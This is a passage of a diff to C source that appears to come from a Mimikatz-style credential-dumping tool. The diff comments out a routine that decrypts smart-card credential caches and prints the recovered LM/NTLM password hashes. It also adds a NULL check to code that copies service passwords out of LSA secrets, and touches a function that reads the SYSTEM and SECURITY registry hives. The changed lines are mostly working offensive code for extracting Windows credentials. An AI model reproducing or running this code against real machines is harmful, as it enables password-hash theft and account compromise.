-														kull_m_string_wprintf_hex(ntlmCredential4->NtPassword, LM_NTLM_HASH_LENGTH, 0);
-													}
-													break;
-												default:
-													kprintf(L"\nUnknown version: %u\n", ntlmCredential->Version);
-												}
-											}
-											else if(RtlEqualUnicodeString(&LSACRED_PACKAGE_NAME, &credentialData->Credentials[i].PackageName, TRUE))
-											{
-												if(kull_m_rpc_DecodeCredentialKeys(credentialData->Credentials[i].Credentials, credentialData->Credentials[i].CredentialSize, &pKeys))
-												{
-													//for(j = 0; j < pKeys->count; j++) //TODO FIXME
-														//kuhl_m_sekurlsa_genericKeyOutput(&pKeys->keys[j], NULL);
-													kull_m_rpc_FreeCredentialKeys(&pKeys);
-												}
-											}
-											else
-											{
-												kprintf(L"\n");
-												kull_m_string_wprintf_hex(credentialData->Credentials[i].Credentials, credentialData->Credentials[i].CredentialSize, 1 | (16 << 16));
-											}
-											kprintf(L"\n");
-										}
-										kull_m_pac_FreeCredential(&credentialData);
-									}
-								}
-								else PRINT_ERROR_AUTO(L"CryptDecrypt");
-								CryptDestroyKey(hKey);
-							}
-							else PRINT_ERROR_AUTO(L"CryptDeriveKey(RC4)");
-							CryptDestroyHash(hHash2);
-						}
-					}
-					else PRINT_ERROR_AUTO(L"CryptSignHash(data)");
-					LocalFree(sig);
-				}
-			}
-			else PRINT_ERROR_AUTO(L"CryptSignHash(init)");
-			CryptDestroyHash(hHash);
-		}
-	}
-	return status;
-}
+//DECLARE_CONST_UNICODE_STRING(LSACRED_PACKAGE_NAME, LSA_CREDENTIAL_KEY_PACKAGE_NAME);
+//BOOL kuhl_m_lsadump_decryptSCCache(PBYTE data, DWORD size, HCRYPTPROV hProv, DWORD keySpec)
+//{
+//	BOOL status = FALSE;
+//	PKIWI_ENC_SC_DATA pEnc = NULL;
+//	DWORD toDecryptSize = 0;
+//	
+//	HCRYPTHASH hHash, hHash2;
+//	DWORD dwSigLen = 0;
+//	PBYTE sig;
+//	HCRYPTKEY hKey;
+//
+//	DWORD i;
+//	PPAC_CREDENTIAL_DATA credentialData = NULL;
+//	PNTLM_SUPPLEMENTAL_CREDENTIAL ntlmCredential;
+//	PNTLM_SUPPLEMENTAL_CREDENTIAL_V4 ntlmCredential4;
+//	PKIWI_CREDENTIAL_KEYS pKeys = NULL;
+//
+//	if(size > sizeof(KIWI_ENC_SC_DATA))
+//	{
+//		if(RtlEqualMemory(data, "SuppData", 8))
+//		{
+//			pEnc = &((PKIWI_ENC_SC_DATA_NEW) data)->data;
+//			toDecryptSize = ((PKIWI_ENC_SC_DATA_NEW) data)->dataSize - FIELD_OFFSET(KIWI_ENC_SC_DATA, toDecrypt);
+//		}
+//		else
+//		{
+//			pEnc = (PKIWI_ENC_SC_DATA) data;
+//			toDecryptSize = size - FIELD_OFFSET(KIWI_ENC_SC_DATA, toDecrypt);
+//		}
+//
+//		if(CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash))
+//		{
+//			CryptHashData(hHash, pEnc->toSign, sizeof(pEnc->toSign), 0);
+//			if(CryptSignHash(hHash, keySpec, NULL, 0, NULL, &dwSigLen))
+//			{
+//				if(sig = (PBYTE) LocalAlloc(LPTR, dwSigLen))
+//				{
+//					if(CryptSignHash(hHash, keySpec, NULL, 0, sig, &dwSigLen))
+//					{
+//						if(CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash2))
+//						{
+//							CryptHashData(hHash2, sig, dwSigLen, 0);
+//							CryptHashData(hHash2, pEnc->toHash, sizeof(pEnc->toHash), 0);
+//							if(CryptDeriveKey(hProv, CALG_RC4, hHash2, 0, &hKey)) // maybe RC2 sometimes ?
+//							{
+//								if(status = CryptDecrypt(hKey, 0, TRUE, 0, pEnc->toDecrypt, &toDecryptSize))
+//								{
+//									if(kull_m_pac_DecodeCredential(pEnc->toDecrypt + 24, toDecryptSize - 24, &credentialData))
+//									{
+//										for(i = 0; i < credentialData->CredentialCount; i++)
+//										{
+//											kprintf(L"  [%u] %wZ", i, &credentialData->Credentials[i].PackageName);
+//											if(RtlEqualUnicodeString(&NTLM_PACKAGE_NAME, &credentialData->Credentials[i].PackageName, TRUE))
+//											{
+//												ntlmCredential = (PNTLM_SUPPLEMENTAL_CREDENTIAL) credentialData->Credentials[i].Credentials;
+//												switch(ntlmCredential->Version)
+//												{
+//												case 0:
+//													if(ntlmCredential->Flags & 1)
+//													{
+//														kprintf(L"\n    LM: ");
+//														kull_m_string_wprintf_hex(ntlmCredential->LmPassword, LM_NTLM_HASH_LENGTH, 0);
+//													}
+//													if(ntlmCredential->Flags & 2)
+//													{
+//														kprintf(L"\n  NTLM: ");
+//														kull_m_string_wprintf_hex(ntlmCredential->NtPassword, LM_NTLM_HASH_LENGTH, 0);
+//													}
+//													break;
+//												case 4: // 10 ?
+//													ntlmCredential4 = (PNTLM_SUPPLEMENTAL_CREDENTIAL_V4) ntlmCredential;
+//													if(ntlmCredential4->Flags & 2)
+//													{
+//														kprintf(L"\n  NTLM: ");
+//														kull_m_string_wprintf_hex(ntlmCredential4->NtPassword, LM_NTLM_HASH_LENGTH, 0);
+//													}
+//													break;
+//												default:
+//													kprintf(L"\nUnknown version: %u\n", ntlmCredential->Version);
+//												}
+//											}
+//											else if(RtlEqualUnicodeString(&LSACRED_PACKAGE_NAME, &credentialData->Credentials[i].PackageName, TRUE))
+//											{
+//												if(kull_m_rpc_DecodeCredentialKeys(credentialData->Credentials[i].Credentials, credentialData->Credentials[i].CredentialSize, &pKeys))
+//												{
+//													//for(j = 0; j < pKeys->count; j++) //TODO FIXME
+//														//kuhl_m_sekurlsa_genericKeyOutput(&pKeys->keys[j], NULL);
+//													kull_m_rpc_FreeCredentialKeys(&pKeys);
+//												}
+//											}
+//											else
+//											{
+//												kprintf(L"\n");
+//												kull_m_string_wprintf_hex(credentialData->Credentials[i].Credentials, credentialData->Credentials[i].CredentialSize, 1 | (16 << 16));
+//											}
+//											kprintf(L"\n");
+//										}
+//										kull_m_pac_FreeCredential(&credentialData);
+//									}
+//								}
+//								else PRINT_ERROR_AUTO(L"CryptDecrypt");
+//								CryptDestroyKey(hKey);
+//							}
+//							else PRINT_ERROR_AUTO(L"CryptDeriveKey(RC4)");
+//							CryptDestroyHash(hHash2);
+//						}
+//					}
+//					else PRINT_ERROR_AUTO(L"CryptSignHash(data)");
+//					LocalFree(sig);
+//				}
+//			}
+//			else PRINT_ERROR_AUTO(L"CryptSignHash(init)");
+//			CryptDestroyHash(hHash);
+//		}
+//	}
+//	return status;
+//}
 
 void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName)
 {
@@ -661,8 +672,10 @@ void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PC
 					//Allocate memory for service name
 					unsigned int svc_pwd_buf_size =  candidateString.Length + 2;
 					wchar_t *svc_pwd_str = (wchar_t *)calloc(1, svc_pwd_buf_size );
-					memcpy(svc_pwd_str, candidateString.Buffer, svc_pwd_buf_size - 2);
-					svc_struct->service_password = svc_pwd_str;
+					if( svc_pwd_str != NULL ){
+						memcpy(svc_pwd_str, candidateString.Buffer, svc_pwd_buf_size - 2);
+						svc_struct->service_password = svc_pwd_str;
+					}
 				}
 			}
 
@@ -769,7 +782,7 @@ NTSTATUS kuhl_m_lsadump_secrets( PSVC_STRUCT *svc_arr, size_t svc_arr_size, LPCS
 	PKULL_M_REGISTRY_HANDLE hSystem, hSecurity;
 	BYTE sysKey[SYSKEY_LENGTH];
 	KUHL_LSADUMP_DCC_CACHE_DATA cacheData = {0};
-
+	
 	hDataSystem = CreateFileA(szSystem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if(hDataSystem != INVALID_HANDLE_VALUE)
 	{
